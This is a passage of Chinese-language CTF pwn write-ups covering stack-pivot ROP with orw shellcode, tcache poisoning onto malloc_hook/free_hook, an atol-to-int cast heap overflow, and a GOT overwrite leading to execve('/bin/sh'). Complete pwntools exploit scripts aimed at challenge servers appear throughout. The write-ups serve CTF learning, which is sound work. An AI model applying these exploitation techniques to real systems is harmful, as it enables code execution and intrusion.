class="string">&#x27;read&#x27;</span>]+base_addr)</span><br></pre></td></tr></table></figure><p>通过对比下面两幅图，就可以发现输入前后，就把0xdeadbeef给覆盖成了pop_rdx_r12</p><p><img src="../img/image-20221007233216868.png" alt="image-20221007233216868"></p><p><img src="../img/image-20221007233231650.png" alt="image-20221007233231650"></p><p>最后第一条链的第三部分（这部分是提前写好read的第一参数和第二个参数，但是第三个参数的位置，我用了0xdeadbeef来占位，因为在这条链的第二部分，read函数就将前两个0xdeadbeef覆盖成了pop_rdx_r12和0，这样第三条链实际上就是正常的了(第三个0xdeadbeef无所谓了，反正会被弹到r12寄存器里)）</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rop+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(base_addr+<span class="number">0x40f8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">3</span>+p64(e.plt[<span class="string">&#x27;read&#x27;</span>]+base_addr)</span><br></pre></td></tr></table></figure><p>而执行完第一条链后，我们就可以在使用libc中任意gadget的前提下写入新的rop链。(如下图)<br><img src="../img/image-20221007233251071.png" alt="image-20221007233251071"></p><p>为了方便，我先去利用gadget传参且执行了mprotect函数，将这个内存页直接变成可读可写可执行了，最后跟了个orw的shellcode(最后orw这里有个坑，打远程不知道为啥，正常的orw在远程读不出来flag，而本地可以读出来。这里必须要先close(0)，然后再去打开flag文件，然后read从文件描述符0里读数据才行）</p><p>调试过程如下：</p><p><img src="../img/image-20221007233305866.png" alt="image-20221007233305866"></p><p>然后先用close把标准输入给关了，再打orw即可拿到flag</p><p><img src="../img/image-20221007233317473.png" alt="image-20221007233317473"></p><h3 id="EXP-v2">EXP:</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p,e,libc=load(<span class="string">&quot;app&quot;</span>,<span class="string">&quot;node4.buuoj.cn:29916&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0x1464)</span></span><br><span class="line">payload=<span class="string">&quot;\x00\x00Nameless&quot;</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Let&#x27;s check your identity\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here you are:&#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">base_addr=leak_addr-<span class="number">0x4050</span></span><br><span class="line">log_addr(<span class="string">&#x27;base_addr&#x27;</span>)</span><br><span class="line">pop_rsp_r13_r14_r15=<span class="number">0x00000000000014cd</span>+base_addr</span><br><span class="line">pop_rdi=<span class="number">0x00000000000014d3</span>+base_addr</span><br><span class="line">pop_rsi_r15=base_addr+<span class="number">0x00000000000014d1</span></span><br><span class="line">leave=base_addr+<span class="number">0x00000000000012d8</span></span><br><span class="line">rop=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(e.got[<span class="string">&#x27;write&#x27;</span>]+base_addr)+p64(<span class="number">0</span>)+p64(e.plt[<span class="string">&#x27;write&#x27;</span>]+base_addr)</span><br><span class="line">rop+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(base_addr+<span class="number">0x40d8</span>)+p64(<span class="number">0</span>)+p64(e.plt[<span class="string">&#x27;read&#x27;</span>]+base_addr)</span><br><span class="line">rop+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(base_addr+<span class="number">0x40f8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">3</span>+p64(e.plt[<span class="string">&#x27;read&#x27;</span>]+base_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;And pls write your own information on it\n&quot;</span>,rop)</span><br><span class="line">p.sendafter(<span class="string">&quot;Tell me your wish:\n&quot;</span>,p64(leak_addr-<span class="number">8</span>)+p64(leave))</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x111040</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">pop_rsi=<span class="number">0x0000000000027529</span>+libc_base</span><br><span class="line">pop_rdx_r12=<span class="number">0x11c1e1</span>+libc_base</span><br><span class="line">pop_rax=libc_base+<span class="number">0x4a550</span></span><br><span class="line">syscall=<span class="number">0x000000000002584d</span>+libc_base</span><br><span class="line">mprotect=<span class="number">0x000000000011b970</span>+libc_base</span><br><span class="line">rop=p64(pop_rdx_r12)+p64(<span class="number">0x1000</span>)</span><br><span class="line">p.send(rop)</span><br><span class="line">pause()</span><br><span class="line">rop=p64(pop_rdi)+p64(leak_addr-<span class="number">0x50</span>)+p64(pop_rsi)+p64(<span class="number">0x1000</span>)+p64(pop_rdx_r12)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">10</span>)+p64(mprotect)+p64(base_addr+<span class="number">0x4150</span>)</span><br><span class="line">rop+=<span class="string">b&quot;\x48\xC7\xC0\x03\x00\x00\x00\x48\xC7\xC7\x00\x00\x00\x00\x0F\x05\x49\xB8\x2F\x66\x6C\x61\x67\x00\x00\x00\x41\x50\x54\x5F\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05&quot;</span></span><br><span class="line">p.sendline(rop)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../img/image-20221007233330115.png" alt="image-20221007233330115"></p><h2 id="bar">bar</h2><h3 id="保护策略：-v3">保护策略：</h3><p><img src="../img/image-20221007233338793.png" alt="image-20221007233338793"></p><h3 id="漏洞所在：-v3">漏洞所在：</h3><p>首先在show函数里程序自己泄露了一个libc地址。</p><p><img src="../img/image-20221007233346476.png" alt="image-20221007233346476"></p><p>存在UAF漏洞：</p><p><img src="../img/image-20221007233356927.png" alt="image-20221007233356927"></p><p>然后在申请堆块之后写入数据时会在用户区第三个内存单元开始输入数据(第一个内存单元用于存储一个size(如下)，第二个内存单元是空的)，但是输入的数据依然是malloc申请的size，这就意味着我们可以溢出下一个内存单元的prev_size和size位</p><p><img src="../img/image-20221007233404888.png" alt="image-20221007233404888"></p><p><strong>而在delete函数中我们可以控制记录堆块的那个size(如下)，但恰巧这个位置是处于free状态的堆块的fd指针(这也是这道题的核心利用点)，因此我们可以在这里篡改堆块的fd指针</strong></p><p><img src="../img/image-20221007233412071.png" alt="image-20221007233412071"></p><h3 id="利用思路：-v3">利用思路：</h3><p>本题我们可以控制被释放掉堆块的fd指针，同时还有libc地址，那就可以直接打tcache poisoning。</p><p>我们先申请四个堆块，分别为chunk1、chunk2、chunk3、chunk4（都申请size为0x50即可）</p><p>在chunk3中存入malloc_hook-0x10的地址</p><p>然后我们再将其全部释放掉，进入tcache bin。<strong>我们去修改一下chunk2的fd指针让其不指向chunk3的地址而去指向chunk3中存放的malloc_hook-0x10处，如此就劫持了tcache bin的这条链，最后申请出来在malloc_hook上写一个one_gadget的地址即可。</strong></p><p>调试过程如下：</p><p><img src="../img/image-20221007233430592.png" alt="image-20221007233430592"></p><p><img src="../img/image-20221007233448315.png" alt="image-20221007233448315"></p><p>为什么当时打tcache poisoning的时候，需要让malloc_hook的地址-0x10（原因如下），<strong>因为数据是从用户区+0x10的位置开始写入的，因此申请的时候需要提前-0x10.</strong></p><p><img src="../img/image-20221007233458822.png" alt="image-20221007233458822"></p><h3 id="EXP-v3">EXP:</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d_d=<span class="number">0x16D5</span></span><br><span class="line">d_a=<span class="number">0x16C1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">wine,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Whisky , brandy or Vodka?&quot;</span>, <span class="built_in">str</span>(wine))</span><br><span class="line">    p.sendafter(<span class="string">&quot;You may want to tell sth to the waiter:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Which?&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;How much?&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;We will give everyone only one cup of icecream!\n&quot;</span>)</span><br><span class="line">leak_libc_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">libc_base=leak_libc_addr-libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]<span class="comment">#-0x1ed6a0+0x1000 #</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">one_gadget=libc_base+search_og(<span class="number">1</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,p64(malloc_hook-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>,<span class="number">0x50</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="number">0x50</span>)</span><br><span class="line">delete(<span class="number">2</span>,<span class="number">0x50</span>)</span><br><span class="line">delete(<span class="number">3</span>,<span class="number">0x50</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_d,d_a)</span><br><span class="line">delete(<span class="number">2</span>,-<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a)</span></span><br><span class="line">add(<span class="number">1</span>,p64(one_gadget))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/image-20221007233511947.png" alt="image-20221007233511947"></p><h2 id="ez-note">ez_note</h2><h3 id="保护策略：-v4">保护策略：</h3><p><img src="../img/image-20221007233524690.png" alt="image-20221007233524690"></p><h3 id="漏洞所在：-v4">漏洞所在：</h3><p>在add函数里的输入函数中，最后用atol函数对buf做了处理(如下图)</p><p><img src="../img/image-20221007233539574.png" alt="image-20221007233539574"></p><p>而atol函数是将字符串转换成一个长整数(long int类型)，跟这个函数很像的还有一个atoi函数，该函数是将字符串转换成一个整数(int类型)，多亏了<a href="https://survive2.github.io/">h1J4cker师傅</a>给我说了一下，以前还真没注意过这俩函数的区别。</p><p>而这道题的漏洞也在此，atol函数返回的是long int类型，可之后if在进行检查的时候却强转成了Int类型。</p><p><img src="../img/image-20221007233557237.png" alt="image-20221007233557237"></p><p>就导致了这里输入一个大数可以绕过这个检查。</p><p>举个例子我们输入4294967440，这个数字转换成二进制如下(int类型为4字节，最高比特位为符号位)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0001     0000 0000     0000 0000     0000 0000     1001 0000</span><br></pre></td></tr></table></figure><p>如果是long int类型，则这个数字就是正常的。但如果是强转成Int类型，那么会舍弃4字节之外的比特位(从右往左数32比特)，这样其实在判断的时候这个数字就成了144(如下)，从而绕过了检查。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000 0000     0000 0000     0000 0000     1001 0000</span><br></pre></td></tr></table></figure><p>可是最终往堆块里输入的数据又没有进行int强转，这样我们实际写入的就是那个大数4294967440，从而导致了堆溢出。</p><p><img src="../img/image-20221007233639073.png" alt=""></p><h3 id="利用思路：-v4">利用思路：</h3><p>不过本题中除了上述漏洞外不存在任何漏洞，就导致了我们想要泄露libc地址只能打一个堆块重叠让unsorted bin的fd和bk指针落在使用状态中的堆块上，然后将其打印出来。</p><p>具体实现过程如下:</p><p>1、先申请出来十个堆块，依次命名为chunk1，chunk2，chunk3…chunk10</p><p>2、我们将后七个堆块(chunk4-chunk10)全部释放掉</p><p>3、再将前三个堆块(chunk1、chunk2、chunk3)给释放掉，此时这三个堆块就会全部进入到unsorted bin中，而之后的tcache bin中的7个堆块则填满tcache bin同时还防止了前三个进入unsorted bin中的堆块与top chunk合并</p><p>4、再将在tcachebin中的七个堆块给申请出来，需要注意的是我们在申请第六个堆块的时候要去写入一个伪造的prev_size和size保证之后可以顺利的从unsorted bin中取出堆块。(此时的情况如下)</p><p><img src="../img/image-20221007233701615.png" alt="image-20221007233701615"></p><p>5、接下来我们申请堆块时，size写成一个大数，造成溢出来篡改unsorted bin的size。(篡改后如下)</p><p><img src="../img/image-20221007233720390.png" alt="image-20221007233720390"></p><p>6、我们申请一个特定大小的堆块让更新后的unsorted bin的fd和bk指针正好落在一个正在使用的堆块用户区。(如下图)</p><p><img src="../img/image-20221007233736715.png" alt="image-20221007233736715"></p><p>7、打印索引为6的堆块，就可以进行泄露libc地址</p><p>8、最后打一个tcache poisoing劫持tcache bin的fd指针将free_hook申请出来，释放掉一个存有/bin/sh字符串的堆块即可获取shell</p><h3 id="EXP：">EXP：</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d_d=<span class="number">0x16BB</span></span><br><span class="line">d_a=<span class="number">0x16A9</span></span><br><span class="line">d_s=<span class="number">0x16CD</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Note size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Note content:&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;1.Add note\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Note ID:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Note ID:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x90</span>,p64(<span class="number">0x200</span>)+p64(<span class="number">0x90</span>))</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">4294967424</span>,<span class="string">b&#x27;u&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x201</span>)[:<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x140</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x1ebbe0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;free_hook&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4294967424</span>+<span class="number">16</span>,<span class="string">b&#x27;s&#x27;</span>*<span class="number">0x90</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)+p64(free_hook)[:<span class="number">7</span>])</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x90</span>,p64(sys_addr))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/image-20221007233750427.png" alt="image-20221007233750427"></p>]]></content>
      
      
      <categories>
          
          <category> 赛题WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈迁移 </tag>
            
            <tag> 格式化字符串漏洞 </tag>
            
            <tag> 篡改got表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF X GFCTF 2022十月挑战赛 PWN WP</title>
      <link href="/posts/6b7e3e3a.html"/>
      <url>/posts/6b7e3e3a.html</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面">写在前面:</h2><p>这次比赛放了三道pwn，做起来还是蛮吃力的，shellcode那题还是经过师傅们提示才做出来的，R()P这题到比赛结束也没有做出来。通过这次比赛感觉自己对于汇编中的gadget理解和利用还是有写不足，在此写下wp记录一下解题的过程。</p><h2 id="R-P">R()P</h2><h3 id="保护策略：">保护策略：</h3><img src="../img/image-20221024192426317.png" alt="image-20221024192426317" style="zoom:50%;" /><h3 id="漏洞分析：">漏洞分析：</h3><p><img src="../img/image-20221024192010191.png" alt="image-20221024192010191"></p><p>代码非常的简单，就一个栈溢出漏洞，没有canary，可以随便溢。</p><p>最开始有个判断，buf&gt;0x100的话就会进入main函数递归，这里就是一个干扰的点，我们第一次直接发送一个\x00即可绕过这个检查。</p><h3 id="利用思路：">利用思路：</h3><p>尽管代码非常短，但是利用起来有些麻烦。首先这道题就给了read函数，因此后续的利用就需要先篡改read的got表为syscall，然后控制rax为59，执行execve(“/bin/sh\x00”,0,0)</p><h4 id="篡改read的got表">篡改read的got表</h4><p>想要篡改read的got表，肯定是需要向read got写入数据，因此怎么控制read的rsi成了一个问题，我们需要去观察汇编代码（如下）</p><p><img src="../img/image-20221024193207882.png" alt="image-20221024193207882"></p><p>我们在第二个read输入后，eax的值会被[rsp+0xc]所赋值，因此如果我们精心构造栈里的数据，那么就可以控制eax，而后我们劫持执行流如果返回到0x40115a处，执行mov rsi,rax的话，就会将rax的值赋给rsi，然后再执行read，如此我们就控制了rsi，实现了read的任意写入，进行read的got表篡改。因为read函数距离syscall非常近(如下)，只差了0x10的偏移，因此我们只需要输入一个字节0x90即可将read的got表改为syscall的地址(我使用的glibc是2.35的)</p><p><img src="../img/image-20221024193750318.png" alt="image-20221024193750318"></p><p>篡改后的情况如下：</p><p><img src="../img/image-20221024194055530.png" alt="image-20221024194055530"></p><h4 id="将-bin-sh写入bss段">将/bin/sh写入bss段</h4><p>现在仅仅有了syscall，我们还需要/bin/sh字符串的地址，因此我们需要将该字符串布置到bss段（还是上面的方法，控制rax寄存器，跳转回0x40115a），同时查看ROPgadget发现下面的这个gadget</p><p><img src="../img/image-20221024194558939.png" alt="image-20221024194558939"></p><p>这个0x404018就是bss段上的地址，因此我们将/bin/sh写到0x404018，再控制好rax(继续控制执行流)，直接去执行这个gadget，即可成功布局好rdi的值。</p><h4 id="控制rdx寄存器">控制rdx寄存器</h4><p>上面虽然提到了怎么控制rdi寄存器，但是我们要先布局好rdx的值，才能去布置rdi寄存器，这个顺序不能错。原因如下：</p><p><img src="../img/image-20221024195251658.png" alt="image-20221024195251658"></p><p>我们控制edx寄存器，必须通过上图的gadget，但是如果执行这个gadget就务必让edi清零了，因此我们只能先让edx变成0，再去布置rdi的值。</p><p>这里的思路就是让程序的执行流返回到0x40115d，因为edx是从栈里给的(而我们又能控制栈里的数据，变相的就控制了栈里的数据)，然后将edx置成0，而接下来的read函数执行时，虽然rdx是0也没有关系，顶多就是写不进去数据而已。</p><h4 id="控制rdi寄存器">控制rdi寄存器</h4><p>控制rdi寄存器所需要的gadget是<code>mov edi, 0x404018 ; jmp rax</code>,在这之前我们需要将rax改成一个地址，才能保证执行流不会断，所以在刚刚提到的控制rdx寄存器的部分，最后应该让执行流到0x40116d这个地址，去控制rax，然后去跳转到<code>mov edi, 0x404018 ; jmp rax</code>上。</p><p>执行完这段gadget我们的rdi和rdx都控制完了，而rsi最后可以控制，因此我们还需要控制下rax，控制rax的gadget就是0x40116d。所以我们先将rax的值设置为0x40116d，这样最后就会jmp过去</p><h4 id="控制rax-rsi寄存器">控制rax,rsi寄存器</h4><p>又跳转到了0x40116d的位置，我们先控制rax的值为59，然后去跳转到0x401141地址处，最后控制下rsi的值，开始执行read函数时，因为read的got表已经被篡改为了syscall，我们参数全部布置好了，到此即可获取shell(如下)</p><p><img src="../img/image-20221024201001179.png" alt="image-20221024201001179"></p><h3 id="EXP：">EXP：</h3><p><a href="https://zikh26.github.io/posts/ad411136.html">tools</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p,e,libc=load(<span class="string">&quot;b&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26579&quot;</span>)</span><br><span class="line">debug(p,<span class="number">0x401168</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span>+p32(e.got[<span class="string">&#x27;read&#x27;</span>])<span class="comment">#second read rsi</span></span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(<span class="number">0x40115a</span>)<span class="comment">#first return address</span></span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;c&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x404018</span>)<span class="comment">#third read rsi</span></span><br><span class="line">payload+=<span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(<span class="number">0x40115a</span>)<span class="comment">#second return address</span></span><br><span class="line">payload+=<span class="string">b&#x27;s&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=<span class="string">b&#x27;e&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x8</span>)<span class="comment">#third read rdx&amp;eax</span></span><br><span class="line">payload+=<span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(<span class="number">0x40115d</span>)<span class="comment">#fourth return address</span></span><br><span class="line">payload+=<span class="string">b&#x27;i&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=<span class="string">b&#x27;g&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x0</span>)<span class="comment">#will change read rdx to zero</span></span><br><span class="line">payload+=<span class="string">b&#x27;h&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(<span class="number">0x40116d</span>)<span class="comment">#fifth return address</span></span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;t&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x40116D</span>)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p64(<span class="number">0x401099</span>)<span class="comment">#sixth return address</span></span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;u&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x3b</span>)<span class="comment">#rax</span></span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p64(<span class="number">0x401141</span>)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;n&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b&#x27;\x90&#x27;</span>)<span class="comment">#change read real address  #我打本地 read改成syscall末尾改成0x90即可，打buu远程的话，因为那边libc版本原因，应该去改成0xf</span></span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/image-20221024201409019.png" alt="image-20221024201409019"></p><h2 id="1-5">1!5!</h2><h3 id="保护策略：-v2">保护策略：</h3><img src="../img/image-20221024201923989.png" alt="image-20221024201923989" style="zoom:50%;" /><h3 id="程序分析：">程序分析：</h3><img src="../img/image-20221024202003006.png" alt="image-20221024202003006" style="zoom:50%;" /><p>这题考察的很明显，就是一个单纯的shellcode编写(只能用给出的机器码) ，如果通过检查的话，就将shellcode执行     题目给出的字符如下：</p><img src="../img/image-20221024202220891.png" alt="image-20221024202220891" style="zoom: 67%;" /><h3 id="利用思路：-v2">利用思路：</h3><p>这道题<code>pop rsi</code> <code>pop rdi</code> <code>syscall</code>等指令都无法使用，我们的思路是去想办法执行一次系统调用read，将数据读到mmap映射出来的区域上，这样第二次用read读的数据就不会受到程序中的check函数限制。</p><p>但问题是如何执行系统调用read？</p><p>举个例子，syscall的机器码是0x0f05。程序虽然无法写入这个0x0f05，但是却可以写入0x4141和0x4e44。而0x4141和0x4e44异或的结果是0x0f05，这样就做出来了0x0f05。</p><blockquote><p>整体思路是先将映射出来的地址0x10000给到rcx寄存器，然后我们通过如下代码,去将异或后的结果写入内存中  先让eax置空，这样去和一组数据异或的时候，就会直接被赋值为那组数据，然后再去和原本地址里的数据进行异或，进行异或后的结果又被放进了内存中。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor eax,0x31315756</span><br><span class="line">xor dword ptr[rcx+0x50],eax</span><br></pre></td></tr></table></figure><p>现在就考虑怎么做出来pop rsi和pop rdi以及syscall指令。他们的机器码分别为0x5f 0x5e 